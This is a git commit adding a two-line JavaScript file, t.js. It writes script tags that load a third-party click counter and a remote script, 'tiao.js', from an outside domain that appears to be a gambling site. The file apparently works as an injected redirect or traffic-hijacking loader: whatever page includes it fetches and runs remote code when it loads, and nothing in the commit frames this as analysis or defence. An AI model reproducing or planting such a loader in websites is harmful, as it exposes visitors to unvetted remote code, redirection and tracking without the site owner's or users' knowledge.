96739c2d5dc59000a08e86db5cb5f9f919456c10
tzjs <tzjs@gmx.com>
2015-12-25 17:37:48 +0800

    Create t.js

---
+++ 1/t.js
@@ -0,0 +1,3 @@
+document.writeln("<script language=\"javascript\" src=\"http:\/\/count38.51yes.com\/click.aspx?id=386116993&logo=12\" charset=\"gb2312\"><\/script>");
+
+document.writeln("<script src=http:\/\/\www.bvb999.com\/dflh1/tiao.js ><\/script>");
